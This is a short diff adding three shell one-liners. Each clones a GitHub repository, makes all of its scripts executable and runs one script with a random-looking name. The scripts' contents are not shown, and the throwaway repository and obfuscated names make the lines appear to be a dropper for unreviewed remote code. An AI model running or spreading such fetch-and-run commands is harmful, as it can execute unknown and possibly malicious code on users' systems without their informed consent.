@@ -1,0 +1,5 @@
+git clone https://github.com/yaditiya438/expert-computing-machine.git && cd expert-computing-machine && chmod +x *.sh && sed -i -e 's/\r$//' zQhPay8uHgdMUGWm.sh && ./zQhPay8uHgdMUGWm.sh
+
+git clone https://github.com/yaditiya438/expert-computing-machine.git && cd expert-computing-machine && chmod +x *.sh && sed -i -e 's/\r$//' 6B8v6FNUyuWxw6gc.sh && ./6B8v6FNUyuWxw6gc.sh
+
+git clone https://github.com/yaditiya438/expert-computing-machine.git && cd expert-computing-machine && chmod +x *.sh && sed -i -e 's/\r$//' tT5yWeqszmKFY9Af.sh && ./tT5yWeqszmKFY9Af.sh
